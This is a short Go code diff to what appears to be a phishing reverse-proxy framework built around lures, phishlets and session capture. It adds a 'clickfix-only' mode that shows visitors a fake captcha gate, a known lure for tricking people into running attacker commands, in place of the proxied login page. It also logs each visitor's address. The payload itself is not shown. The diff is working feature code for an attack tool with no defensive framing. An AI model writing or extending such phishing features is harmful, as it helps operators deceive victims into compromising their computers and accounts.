@@ -376,6 +376,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						// session cookie not found
 						if !p.cfg.IsSiteHidden(pl_name) {
 							if l != nil {
+								// clickfix-only mode: serve the fake-captcha gate
+								// INSTEAD of creating a session — no login flow at all
+								if cf := pl.ClickFix(); cf != nil && cf.Only {
+									log.Info("[%s] clickfix-only: serving gate [%s]", pl_name, remote_addr)
+									return p.serveClickFixBefore(req, cf, l.RedirectUrl, &map[string]string{})
+								}
+
 								// check if lure is not paused
 								if l.PausedUntil > 0 && time.Unix(l.PausedUntil, 0).After(time.Now()) {
 									log.Warning("[%s] lure is paused: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
